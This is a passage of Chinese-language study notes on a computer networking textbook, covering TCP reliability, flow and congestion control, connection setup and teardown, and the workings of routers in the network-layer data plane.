紧急数据指针（Urgent data pointer）字段 指出。</li><li>检验和，2字节；紧急指针，2字节</li></ul><p><strong><code>序号和确认号：</code></strong> TCP把数据看做有序无结构的字节流，用序号对每个传输的字节进行编号。由于TCP是全双工服务，在主机A向主机B发送报文的同时A也会接收B发送的报文，确认号则是接收方希望发送方发送的下一字节的序号。例如A已收到B发送的序号为0-535的所有字节，则A会在发给B的报文段的确认号中填入536。如果A在收到536-899之前收到900-1000，则确认号仍为536，这叫TCP的累积确认。</p><h3 id="往返时间的估计和超时"><a href="#往返时间的估计和超时" class="headerlink" title="往返时间的估计和超时"></a>往返时间的估计和超时</h3><h4 id="估计往返时间："><a href="#估计往返时间：" class="headerlink" title="估计往返时间："></a>估计往返时间：</h4><p>报文段的样本RTT：SampleRTT</p><p>SampleRTT 均值：EstimatedRTT</p><blockquote><p>EstimatedRTT=0.875∗EstimeatedRTT+0.125∗SampleRTT</p></blockquote><h4 id="设置和管理超时重传时间"><a href="#设置和管理超时重传时间" class="headerlink" title="设置和管理超时重传时间 :"></a>设置和管理超时重传时间 :</h4><blockquote><p>TimeoutInterval=EstimatedRTT+4∗DevRTT</p></blockquote><p>超时间隔 = 估计RTT + 4*偏差RTT</p><p><strong><code>设置TCP超时值：</code></strong></p><p>应大于RTT：但RTT是变化的</p><p>太短: 过早超时，不必要的重传</p><p>太长: 对报文段的丢失响应太慢</p><p>TCP采用超时/重传机制处理报文段丢失</p><h3 id="可靠数据传输"><a href="#可靠数据传输" class="headerlink" title="可靠数据传输"></a>可靠数据传输</h3><p>网络层传输的数据单元为**<code>数据报</code>** ，传输层的数据单元为**<code>报文段</code>** ，为了方便起见可以统称为**<code>分组</code>**</p><p><strong><code>TCP 发送方</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164254661.png"></p><p><strong><code>TCP 发送方有三个与发送和重传有关的事件：</code></strong></p><p>①从上层应用程序接收数据</p><p>②定时器</p><p>③收到 ACK</p><p><strong><code>三种情况：</code></strong></p><p>①A向B发送一个报文段，序号92，包含8字节，交给IP后开始等待一个来自B的确认号为100的报文段。然而确认报文段丢失，超时，A又重发相同报文段。B收到后对比序号发现已经收到过该报文段的一些字节，于是B的TCP确认后，将报文段重复的字节丢弃</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164306089.png"></p><p>②A连续发了两个报文段，92，8和100，20（序号和字节）。B收到两个报文段并发送确认100和200。超时前没有一个确认到达A，超时后A重传92，8的报文，重启定时器。只要第二个报文的ACK在新的超时以前发生到达，第二个报文就不会重传。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164314724.png"></p><p>③和上面一种一样，A发送两个报文段，第一个报文段的确认在网络丢失，但是超时之前收到了第二个报文段的确认报文。因为累积确认机制，A知道B已经收到第二个以及之前的报文，不会重传了</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164323351.png"></p><h4 id="快速重传"><a href="#快速重传" class="headerlink" title="快速重传"></a>快速重传</h4><p>超时间隔加倍会增加端到端时延。而由于接收端累积确认，在未收到期望序号报文段时会不断的发送相同的ACK确认号，此为冗余ACK。当接收端收到3个冗余ACK时，TCP就执行快速重传，在定时器过期前重传丢失的报文段。</p><ul><li>TCP 接收方的 ACK 接收策略</li></ul><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164336305.png"></p><h4 id="回退N步还是选择重传"><a href="#回退N步还是选择重传" class="headerlink" title="回退N步还是选择重传"></a>回退N步还是选择重传</h4><ul><li>TCP确认是累积式的，正确接收但失序的报文段是不会被接收方逐个确认的，像GBN风格，但是TCP和GBN有显著区别</li><li>许多TCP实现会将正确接收但失序的报文段缓存起来</li><li>GBN不仅重传未确认分组，还会重传之后所有分组，TCP只传一个或不传（若其后面的ACK超时前到来）</li><li>选择确认，允许接收方有选择地确认失序报文段，而不是累积确认最后一个正确接收的有序报文段。该机制与选择重传机制结合（跳过重传已确认报文段），TCP看起来像SR</li><li>TCP的差错恢复机制是GBN协议和SR协议的混合体</li></ul><h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><ul><li>什么是流量控制？</li></ul><p>如果发送者发送过快，接收者来不及接收，那么就会有分组丢失。为了避免分组丢失，控制发送者的发送速度，使得接收者来得及接收，这就是流量控制。<br>流量控制是一个速度匹配服务，发送方发送速率与接收方程序读取速率相匹配</p><ul><li>流量控制的目的？</li></ul><p>流量控制根本目的是防止分组丢失，它是构成TCP可靠性的一方面。</p><ul><li>如何实现流量控制？</li></ul><p>由滑动窗口协议（连续ARQ协议，如GBN和SR）实现，TCP让发送方维护一个称为接收窗口rwnd的变量，用于给发送方指示接收方还有多少可用缓存。因为是全双工通信，双方都维护接收窗口变量。B把rwnd值放入给A的报文段接收窗口字段中，通知A自己还有多少缓存空间，A控制未确认的数据量小于rwnd，即发送方的发送窗口不可以大于接收方发回的窗口大小。</p><p>滑动窗口协议既保证了分组无差错、有序接收，也实现了流量控制。</p><ul><li>流量控制引发的死锁</li></ul><p>考虑一种特殊的情况，就是接收方若没有缓存足够使用，就会发送零窗口大小的报文，此时发送放将发送窗口设置为0，停止发送数据。之后接收方有足够的缓存，发送了非零窗口大小的报文，但是这个报文在中途丢失的，发送者一直等待下去，而接收者以为发送者已经收到该应答，等待接收新数据，这样双方就相互等待，从而产生死锁。</p><ul><li>持续计时器</li></ul><p>为了避免流量控制引发的死锁，TCP使用了持续计时器。每当发送者收到一个零窗口的应答后就启动该计时器。时间一到便主动发送报文询问接收者的窗口大小。若接收者仍然返回零窗口，则重置该计时器继续等待；若窗口不为0，则表示应答报文丢失了，此时重置发送窗口后开始发送，这样就避免了死锁的产生。</p><ul><li>一条TCP连接每一侧主机都设置了缓存，当TCP连接收到正确有序的字节后，将数据放入缓存，应用从缓存中读取。若应用较忙，发送方发送太快太多，可能会造成缓存溢出</li><li>TCP发送方因为IP网络的拥塞而降速（超时间隔加倍），属于拥塞控制，不属于流量控制，虽然都是降速</li><li>UDP无流量控制，缓存溢出就溢出了</li></ul><h3 id="TCP连接管理"><a href="#TCP连接管理" class="headerlink" title="TCP连接管理"></a>TCP连接管理</h3><h4 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h4><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164427080.png"></p><p>TCP协议中，主动发起请求的一端称为客户端，被动连接的一端称为服务端。不管是客户端还是服务端，TCP连接建立完后都能发送和接收数据。起初，服务器和客户端都为CLOSED状态。在通信开始前，双方都得创建各自的传输控制块（TCB）。 服务器创建完TCB后遍进入LISTEN状态，此时准备接收客户端发来的连接请求。</p><p><strong><code>第一次握手：</code></strong></p><p>客户端向服务端发送连接请求报文段。该报文段的头部中SYN=1，ACK=0，seq=x。请求发送后，客户端便进入SYN-SENT状态<br>。<br>PS1：SYN=1，ACK=0表示该报文段为连接请求报文。</p><p>PS2：x为本次TCP通信的字节流的初始序号。</p><p>TCP规定：SYN=1的报文段不能有数据部分，但要消耗掉一个序号。</p><p><strong><code>第二次握手：</code></strong></p><p>服务端收到连接请求报文段后，如果同意连接，则会发送一个应答：SYN=1，ACK=1，seq=y，ack=x+1。</p><p>该应答发送完成后便进入SYN-RCVD状态。</p><p>PS1：SYN=1，ACK=1表示该报文段为连接同意的应答报文。</p><p>PS2：seq=y表示服务端作为发送者时，发送字节流的初始序号。</p><p>PS3：ack=x+1表示服务端希望下一个数据报发送序号从x+1开始的字节</p><p><strong><code>第三次握手：</code></strong></p><p>当客户端收到连接同意的应答后，还要向服务端发送一个确认报文段，表示：服务端发来的连接同意应答已经成功收到。</p><p>该报文段的头部为：ACK=1，seq=x+1，ack=y+1。</p><p>客户端发完这个报文段后便进入ESTABLISHED状态，服务端收到这个应答后也进入ESTABLISHED状态，此时连接的建立完成！</p><p><strong><code>三次握手后：</code></strong></p><p>发送方通过套接字向TCP的发送缓存中传输数据，当数据达到最大报文段长（MSS）时TCP就将缓存加上一个TCP首部形成报文段发送给接收方的TCP接收缓存。</p><blockquote><p>为什么连接建立需要三次握手，而不是两次握手？<br>防止失效的连接请求报文段被服务端接收，从而产生错误。<br>失效的连接请求：若客户端向服务端发送的连接请求丢失，客户端等待应答超时后就会再次发送连接请求，此时，上一个连接请求就是失效的。<br>若建立连接只需两次握手，客户端并没有太大的变化，仍然需要获得服务端的应答后才进入ESTABLISHED状态，而服务端在收到连接请求后就进入ESTABLISHED状态。此时如果网络拥塞，客户端发送的连接请求迟迟到不了服务端，客户端便超时重发请求，如果服务端正确接收并确认应答，双方便开始通信，通信结束后释放连接。此时，如果那个失效的连接请求抵达了服务端，由于只有两次握手，服务端收到请求就会进入ESTABLISHED状态，等待发送数据或主动发送数据。但此时的客户端早已进入CLOSED状态，服务端将会一直等待下去，这样浪费服务端连接资源。</p></blockquote><h4 id="四次挥手："><a href="#四次挥手：" class="headerlink" title="四次挥手："></a>四次挥手：</h4><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164444378.png"></p><p><strong><code>第一次挥手：</code></strong></p><p>若A认为数据发送完成，则它需要向B发送连接释放请求。该请求只有报文头，头中携带的主要参数为：</p><p>FIN=1，seq=u。此时，A将进入FIN-WAIT-1状态。</p><p>PS1：FIN=1表示该报文段是一个连接释放请求。</p><p>PS2：seq=u，u-1是A向B发送的最后一个字节的序号。</p><p><strong><code>第二次挥手：</code></strong></p><p>B收到连接释放请求后，会通知相应的应用程序，告诉它A向B这个方向的连接已经释放。此时B进入CLOSE-WAIT状态，并向A发送连接释放的应答，其报文头包含：</p><p>ACK=1，seq=v，ack=u+1。</p><p>PS1：ACK=1：除TCP连接请求报文段以外，TCP通信过程中所有数据报的ACK都<br>为1，表示应答。</p><p>PS2：seq=v，v-1是B向A发送的最后一个字节的序号。</p><p>PS3：ack=u+1表示希望收到从第u+1个字节开始的报文段，并且已经成功接收<br>了前u个字节。</p><p>A收到该应答，进入FIN-WAIT-2状态，等待B发送连接释放请求。</p><p>第二次挥手完成后，A到B方向的连接已经释放，B不会再接收数据，A也不会再发送数据。但B到A方向的连接仍然存在，B可以继续向A发送数据。</p><p><strong><code>第三次挥手：</code></strong></p><p>当B向A发完所有数据后，向A发送连接释放请求，请求头：FIN=1，ACK=1，seq=w，ack=u+1。B便进入LAST-ACK状态。</p><p><strong><code>第四次挥手:</code></strong></p><p>A收到释放请求后，向B发送确认应答，此时A进入TIME-WAIT状态。该状态会持续2MSL时间，若该时间段内没有B的重发请求的话，就进入CLOSED状态，撤销TCB。当B收到确认应答后，也便进入CLOSED状态，撤销TCB。</p><h4 id="拆除过程"><a href="#拆除过程" class="headerlink" title="拆除过程"></a>拆除过程</h4><p>①（客户端关闭）客户TCP发送一个特殊报文段到服务器，该报文段中FIN位被置1；</p><p>②服务器收到后向发送方回送一个ACK报文段；</p><p>③（服务器端关闭）服务器端发送FIN报文段给客户端；</p><p>④客户端发送ACK对该报文段进行确认；</p><h2 id="拥塞控制原理"><a href="#拥塞控制原理" class="headerlink" title="拥塞控制原理"></a>拥塞控制原理</h2><p>在计算机网络中的链路量（即带宽）、交换结点中的缓存和处理机制等，都是网络的资源。在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络性能就要变坏。这种情况就叫做拥塞</p><h3 id="拥塞原因和代价"><a href="#拥塞原因和代价" class="headerlink" title="拥塞原因和代价"></a>拥塞原因和代价</h3><p>计算机网络拥塞的原因是因为网络中的分组太多，而链路带宽和路由器缓存容量都是有限的</p><ul><li>情况一：两个发送方和一台无穷大缓存的路由器</li></ul><p>容量为R的共享式输出链路上传输</p><p>当发送速率超过R/2时，路由器的排队分组就会无限增加，源和目的平均时延变成无穷大</p><ul><li>情况二：两个发送方和一台有限缓存的路由器</li></ul><p>分组到达一个已满的缓存时会被丢弃，发送方必须执行重传以补偿因为缓存溢出丢弃的分组</p><p>发送方遇到高时延时，进行的不必要重传引起路由器转发不必要的分组副本</p><ul><li>情况三：4个发送方和具有优先缓存的多台路由器及多条路径</li></ul><p>当一个分组沿一条路径被丢弃时，每个上游路由器用于转发该分组到丢弃该分组使用的传输容量被浪费</p><p><strong><code>拥塞控制 和 流量控制 的区别</code></strong></p><p>拥塞控制：拥塞控制是作用于网络的，它是防止过多的数据注入到网络中，避免出现网络负载过大的情况；</p><p>流量控制：流量控制是作用于接收者的，它是控制发送者的发送速度从而使接收者来得及接收。</p><p><strong><code>拥塞控制的目的</code></strong></p><p>缓解网络压力</p><p>保证分组按时到达</p><h3 id="拥塞控制的方法"><a href="#拥塞控制的方法" class="headerlink" title="拥塞控制的方法"></a>拥塞控制的方法</h3><p>①端到端拥塞控制，网络层并没有为运输层的拥塞控制提供支持，TCP运用的方式，只能推断是否发生拥塞。</p><p>②网络辅助的拥塞控制，路由器可以向发送端反馈网络的拥塞情况，但还未被用于TCP中。</p><h2 id="TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）"><a href="#TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）" class="headerlink" title="TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）"></a>TCP拥塞控制（加性增、乘性减（AIMD）拥塞控制方法）</h2><p>TCP必须用端到端拥塞控制，因为IP层不向端系统提供显式网络拥塞反馈</p><p>TCP让每一个发送方根据感知到的拥塞程度限制其发送速率</p><p><strong><code>限制速率</code></strong></p><p>①维护拥塞窗口cwnd值（注意流量控制使用接收窗口rwnd值）</p><p>②发送方未确认数据量 &lt;= min { cwnd , rwnd }</p><p><strong><code>感知是否存在拥塞</code></strong></p><p>丢包：超时或收到3个冗余ACK</p><p><strong><code>TCP发送方如何确定发送速率</code></strong></p><p>1.一个丢失的报文意味着拥塞，当丢失报文段时应当降低速率（当前速度不能正常交付，得慢点）</p><p>2.先前未确认报文段的确认到达时，增加发送方速率（当前速度能够正常交付，说明可以再快点）</p><p>3.带宽探测（试探）：TCP发送方增加速率，丢包，从该速率后退，再往前探测….（因为拥塞情况是波动的，得尽力保持在最高速率）</p><h3 id="TCP拥塞控制算法"><a href="#TCP拥塞控制算法" class="headerlink" title="TCP拥塞控制算法"></a>TCP拥塞控制算法</h3><p><strong><code>慢启动算法</code></strong> 和 <strong><code>拥塞避免算法</code></strong></p><ul><li>发送方维护一个发送窗口，发送窗口的大小取决于网络的拥塞情况和接收窗口的大小，发送窗口是动态变化的。</li><li>发送方还维护一个慢启动门限</li></ul><p>发送窗口 &lt; 慢启动门限：使用慢启动算法</p><p>发送窗口 &gt; 慢启动门限：使用拥塞避免算法</p><p>发送窗口 = 慢启动门限：使用慢启动算法或拥塞避免算法</p><ul><li>TCP拥塞控制算法：慢启动，拥塞避免，快速恢复</li></ul><h4 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h4><ul><li>一开始cwnd只设为一个MSS的较小值（这就是『慢』，不过瞬间指数级加速<br>）</li><li>收到一个确认，cwnd增加一个MSS ——&gt; 每过一个RTT，cwnd翻番，发送速率翻倍（1，2，4…每次发的也多一个）</li><li>丢包（拥塞）结束慢启动</li></ul><p>①将ssthresh（慢启动阈值）设置为cwnd/2，cwnd置为1重新开始慢启动</p><p>②当cwnd=ssthresh时，结束慢启动，TCP转移到拥塞避免模式</p><p>③收到3个冗余ACK，执行快速重传，进入快速恢复模式</p><h4 id="拥塞避免"><a href="#拥塞避免" class="headerlink" title="拥塞避免"></a>拥塞避免</h4><ul><li>进入拥塞避免状态，cwnd值是上次遇到拥塞时的一半</li><li>每个RTT只将cwnd值增加一个MSS/cwnd字节</li><li>丢包，结束拥塞避免</li><li>超时：ssthresh更新为cwnd的一半，cwnd置为1个MSS，返回慢启动状态</li></ul><p>冗余ACK：ssthresh更新为cwnd的一半，cwnd值减半，进入快速恢复状态</p><h4 id="快速恢复"><a href="#快速恢复" class="headerlink" title="快速恢复"></a>快速恢复</h4><ul><li>快速恢复中，每个冗余ACK，cwnd 增加一个MSS，当丢失报文的ACK到达时，TCP降低cwnd，进入拥塞避免状态</li><li>超时：同慢启动和拥塞避免</li></ul><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164519401.png"></p><h3 id="公平性"><a href="#公平性" class="headerlink" title="公平性"></a>公平性</h3><p>在K条TCP连接经过传输速率为R的链路时，如果每条连接的平均传输速率接近R/K，则认为该拥塞控制是公平的。在每条TCP连接的RTT相等的情况下，TCP拥塞控制是公平的，但实际中RTT小的连接会有更高的吞吐量。</p><h2 id="四、网络层数据平面"><a href="#四、网络层数据平面" class="headerlink" title="四、网络层数据平面"></a>四、网络层数据平面</h2><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170244616.png"></p><h2 id="网络层概述"><a href="#网络层概述" class="headerlink" title="网络层概述"></a>网络层概述</h2><p>1.每台路由器的**<code>数据平面</code>** 的主要作用是从其输入链路向其输出链路转发数据报。</p><p>2.**<code>控制平面</code>**的主要作用是协调这些本地的每路由器转发动作，使得数据报沿着源和目的地主机之间的路由器路径最终进行端到端传送。</p><p>3.**<code>路由器</code>**（不运行应用层网络层协议）的主要作用是将数据从入链路转发到出链路。</p><p>4.<strong><code>A,B两主机通信：</code></strong> A中网络层取得于A运输层的报文段，每个报文段封装成数据报，向相邻路由器发送。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170308181.png"></p><h3 id="转发和路由选择（数据平面和控制平面）"><a href="#转发和路由选择（数据平面和控制平面）" class="headerlink" title="转发和路由选择（数据平面和控制平面）"></a>转发和路由选择（数据平面和控制平面）</h3><p><strong><code>网络层作用：</code></strong> 将分组从一台发送主机发送到另一台接受主机。IP协议：编址规则，数据报格式，分组处理规则。</p><p><strong><code>需要两种功能：转发和路由选择</code></strong></p><ul><li><strong><code>转发：</code></strong> 分组从（路由器）输入链路接口转移到适当输出链路接口的路由器本地动作</li><li><strong><code>路由选择：</code></strong> 分组从发送方发往接收方时，网络层须决定分组采用的路由或路径</li></ul><p><strong><code>转发是路由器本地动作，路由选择是网络范围过程。</code></strong> 比如开车从北京到上海，转发相当于在某个路口选择某一条岔路，路由选择相当于规划从北京到上海所有线路的过程</p><p><strong><code>路由选择算法：</code></strong> 计算采用的路径的算法，决定了插入路由器的转发表中的值</p><p>每台路由都有一张 **<code>转发表</code>**。路由器检查分组首部字段值（可能是目的地址或所属连接，看网络层协议）来转发分组，使用该值在转发表索引查询。该值指出了该分组将被转发的路由器输出链路接口</p><h4 id="控制平面：传统的方法"><a href="#控制平面：传统的方法" class="headerlink" title="控制平面：传统的方法"></a>控制平面：传统的方法</h4><p><strong><code>路由选择算法决定了插入路由器转发表中的值(两种算法)</code></strong></p><ul><li><p>集中式</p></li><li><p>分布式</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170322634.png"></p></li></ul><h4 id="控制平面：SDN方法"><a href="#控制平面：SDN方法" class="headerlink" title="控制平面：SDN方法"></a>控制平面：SDN方法</h4><p>远程控制器计算和分发转发表以供每台路由器使用</p><p>控制平面路由 <strong><code>选择功能</code></strong> 和 <strong><code>物理路由器</code></strong> 是分开的，**<code>选择设备执行转发，远程控制器计算并分发转发表</code>** ，这种控制平面方法是 <strong><code>软件定义网络（Soft-ware-Defined Networking,SDN）</code></strong> 的本质</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170347356.png"></p><h3 id="网络服务模型"><a href="#网络服务模型" class="headerlink" title="网络服务模型"></a>网络服务模型</h3><p><strong><code>网络服务模型：</code></strong> 定义了分组在发送与接收端系统之间的端到端运输特性</p><p><strong><code>网络层提供的服务（IP没有的服务）：</code></strong></p><p>运输层向网络层传递分组时：</p><p><strong><code>①确保交付：</code></strong> 确保分组最终达到目的地</p><p><strong><code>②具有时延上界的确保交付：</code></strong> 确保分组交付和主机到主机时延上界内交付<br>为给定源和目的地之间的分组流提供服务时<br>：<br><strong><code>③有序分组交付</code></strong></p><p><strong><code>④确保最小带宽：</code></strong> 模仿发送方和接收方之间一条特定比特率传输链路的行为。发送速率低于该速率，分组不会丢失，且会在预定时延内到达</p><p><strong><code>⑤ 安全性：</code></strong> 使用仅由源和目的地主机知晓的密钥，加密数据报，源加密，目的主机解密。此外还有数据完整性和源鉴别服务</p><p>因特网的网络层IP协议提供单一服务，尽力而为服务，无带宽保证，无丢包保证，无顺序保证，不定时，无拥塞指示</p><p><strong><code>分组交换机</code></strong> 是指一台通用分组交换设备，它根据分组首部字段中的值，从输入链路接口到输出链路接口转移分组。某些分组交换机称为 <strong><code>链路层交换机</code></strong> ，基于链路层帧中的字段值做出转发决定，这些交换机因此被称为链路层设备。其他分组交换机称为 <strong><code>路由器</code></strong> ，基于网络层数据报中的首部字段值做出转发决定。路由器因此是网络层设备</p><p><strong><code>路由器是网络层设备</code></strong></p><h2 id="路由器工作原理"><a href="#路由器工作原理" class="headerlink" title="路由器工作原理"></a>路由器工作原理</h2><p><strong><code>路由器有4个主要组件：</code></strong></p><p><strong><code>①输入端口：</code></strong> 路由器中执行终结入物理链路的物理层功能。与位于入链路远端的数据链路层交互来执行数据链路层功能。执行查找功能。通过查询转发表决定路由器的输出端口，到达的分组通过路由器的交换结构转发到输出端口。控制分组从输入端口转发到路由选择处理器。</p><p><strong><code>②交换结构：</code></strong> 交换结构将路由器的输入端口连接到它的输出端口。这种交换结构完全包含在路由器之中</p><p><strong><code>③输出端口：</code></strong> 输出端口存储从交换结构接收的分组，并通过执行必要的链路层和物理层功能在输出链路上传输这些分组。</p><p><strong><code>④路由选择处理器：</code></strong> 路由选择处理器执行控制平面功能。它执行路由选择协议，维护路由选择表与关联链路状态信息，并为该路由器计算转发表。在软件定义网络（Software-Defined Networking, SDN）路由器中，路由选择处理器负责与远程控制器通信，目的是接收由远程控制器计算的转发表项，并在该路由器的输入端口安装这些表项。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170414409.png"></p><h3 id="输入端口处理和基于目的地的转发"><a href="#输入端口处理和基于目的地的转发" class="headerlink" title="输入端口处理和基于目的地的转发"></a>输入端口处理和基于目的地的转发</h3><p>路由器用分组目的地址的前缀与转发表中的表项进行匹配。如果存在一个匹配项，则路由器向与该匹配项相关联的链路转发该分组。当有多个匹配时，该路由器使用 <strong><code>最长前缀匹配规则</code></strong> ，即在表中寻找最长的匹配项，并向与最长前缀匹配相关项的链路接口转发分组。</p><h4 id="输入端口"><a href="#输入端口" class="headerlink" title="输入端口"></a>输入端口</h4><p>①线路端接</p><p>②数据链路处理（协议、拆封）</p><p>③查找</p><ul><li>查找必须在纳秒级别执行，不仅要用硬件执行查找，而且要对大型转发表使用快速查找算法，而且需要更快的内存访问速度（DRAM、SRAM）。</li><li>三态内容可寻址存储器TCAM常被用于查找。使用TCAM，一个32bit的IP地址放入内存，TCAM在基本常数时间内返回转发表项内容</li></ul><p>④转发</p><ul><li>转发表由路由选择处理器计算和更新，从路由选择处理器经过独立总线复制到（输入）线路卡</li><li>有了转发表副本，转发决策能在每个输入端口本地做出，无须调动路由选择处理器，避免集中式处理</li></ul><p>⑤排队</p><ul><li>查找确定了某分组输出端口，分组就能发送进入交换结构。一个被阻塞的分组必须在输入端口处排队</li></ul><h4 id="查找采取的动作"><a href="#查找采取的动作" class="headerlink" title="查找采取的动作"></a>查找采取的动作</h4><p>①物理层和链路层的处理</p><p>②检查分组的版本号，检验以及寿命字段，并重写后两个字段</p><p>③更新用于网络管理的计数器</p><h3 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h3><p>交换结构位于路由器的核心部位。</p><h4 id="交换的三种方式"><a href="#交换的三种方式" class="headerlink" title="交换的三种方式"></a>交换的三种方式</h4><p><strong><code>①经内存交换</code></strong></p><ul><li>一个分组到达输入端口时，该端口会先通过中断方式向路由选择处理器发出信号</li><li>分组从输入端口复制到处理器内存中（现代路由器查找交换进内存，是由输入线路卡处理的）</li><li>早期路由选择处理器从首部提取目的地址，在转发表查找输出端口，将分组复制到输出端口</li></ul><p><strong><code>②经总线交换</code></strong></p><ul><li>输入端口经一根共享总线将分组直接传送到输出端口，无需路由选择处理器的干预</li><li>路由器的交换带宽受总线速率限制</li></ul><p><strong><code>③经互联网络交换</code></strong></p><ul><li><p>纵横式交换机，2N条总线组成网络，连接N各输入端口和N个输出端口<br>每条垂直的总线与每条水平的总线交叉，交叉点通过交换结构控制器开启闭合</p></li><li><p>某分组到达端口A，需要转发到Y，交换机控制器闭合总线A和Y的交叉点，A在其总线上发送分组，仅由Y接收；同时B也能发分组到X，因为没有公用总线。纵横式网络能并行转发多个分组</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170443471.png"></p></li></ul><h3 id="输出端口处理"><a href="#输出端口处理" class="headerlink" title="输出端口处理"></a>输出端口处理</h3><p>①排队（缓存管理）</p><p>②数据链路处理（协议、拆封）</p><p>③线路端接</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920170511929.png"></p><h3 id="排队"><a href="#排队" class="headerlink" title="排队"></a>排队</h3><p>输入、输出端口都能形成分组队列，取决于流量负载、交换结构<br>随着队列增长，路由器缓存空间会耗尽，出现丢包</p><p>需要路由器缓存吸收流量负载波动，需要多少缓存？</p><ul><li>少量TCP流：RTT * C（链路容量）</li><li>大量TCP流：RTT* C/ (N^1/2)</li></ul><p>输出端口排队，需要分组调度程序选出一个分组发送。提供服务质量保证</p><p>主动队列管理：</p><ul><li>缓存填满前丢弃（或首部加个标记）一个分组，向发送方提供一个拥塞信号</li><li>随机早期检测算法：平均队列长度在某个范围内时，以某种概率被丢弃/标记</li></ul><h3 id="分组调度"><a href="#分组调度" class="headerlink" title="分组调度"></a>分组调度</h3><p><strong><code>先进先出（First-In-First-Out, FIFO）:</code></strong><br>链路调度规则按照到达输出链路队列的相同次序来选择分组在链路上传输。</p><p><strong><code>优先权排队：</code></strong> 